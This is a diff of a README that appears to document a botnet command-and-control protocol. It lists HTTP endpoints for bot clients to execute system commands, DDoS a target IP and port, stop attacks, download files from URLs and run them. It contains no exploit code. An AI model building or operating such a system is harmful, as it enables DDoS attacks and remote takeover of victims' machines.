@@ -3,6 +3,7 @@
  - [x] Create a protocol for client-server comunication
  - [x] Make it work
  - [x] Attack library
+ - [x] Add README.md
  - [ ] UUID for clients?
  - [ ] Add authentification?
 
@@ -11,28 +12,27 @@
 
 ## Allowed methods for sending commands to clients are:
 
- - EXECUTE sys_command
- - - `POST /EXECUTE/sys_command`
- - - execute a command
+ - Execute a command
+   - `POST /EXECUTE/sys_command`
 
- - ATTACK target port [location]
- - - `POST /ATTACK/target/port`
- - - `POST /ATTACK/target/port/location`
- - - DDoS an ip, optionally at location
+ - DDoS an ip, optionally at location
+   - `POST /ATTACK/target/port`
+   - `POST /ATTACK/target/port/location`
 
- - STOP target port
- - - `POST /STOP/target/port`
- - - stop DDoS attack
+ - Stop a DDoS attack
+   - `POST /STOP/target/port`
 
- - DOWNLOAD url [filename]
- - - `POST /DOWNLOAD/url`
- - - `POST /DOWNLOAD/url/filename`
- - - download a file to download directory
+ - Download a file to the downloads folder, optionally specifying filename
+   - `POST /DOWNLOAD/url`
+   - `POST /DOWNLOAD/url/filename`
 
- - RUN filename
- - - `POST /RUN/filename`
- - - run file from download directory
+  - Run a file from the downloads folder
+   - `POST /RUN/filename`
 
-## Notify server
+## Allowed methods for sending requests to server are:
 
-  `POST /NOTIFY/ONLINE`
+ - Notify server
+   - `POST /NOTIFY/ONLINE`
+
+ - Get file from server
+   - `GET /filename`
